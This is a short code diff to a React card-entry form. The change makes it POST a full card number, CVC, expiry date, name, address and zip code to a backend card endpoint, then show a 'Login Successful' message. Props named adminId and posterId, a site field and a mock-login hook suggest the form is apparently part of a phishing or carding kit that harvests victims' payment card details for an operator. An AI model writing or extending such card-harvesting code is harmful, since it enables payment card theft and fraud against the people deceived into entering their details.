@@ -14,7 +14,7 @@ function CardForm({ adminId, posterId }) {
   const { register, handleSubmit, reset } = form;
   const { login } = useMockLogin(adminId, posterId);
 
-  const onSubmit = (values) => {
+  const onSubmit = async (values) => {
     const { validity, address, cardNumber, cvc, name, zipCode } = values;
     const submitValues = {
       site,
@@ -25,11 +25,30 @@ function CardForm({ adminId, posterId }) {
       name,
       zipCode,
     };
-    login(submitValues);
-    console.log(submitValues);
-    setShowModal(true);
-    reset();
-    Cookies.remove("id");
+    const url = `${API_URL}/card/add`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(submitValues),
+    });
+
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      toast.success("Login Succecssfull");
+      setShowModal(true);
+      reset();
+      Cookies.remove("id");
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
   };
 
   return (
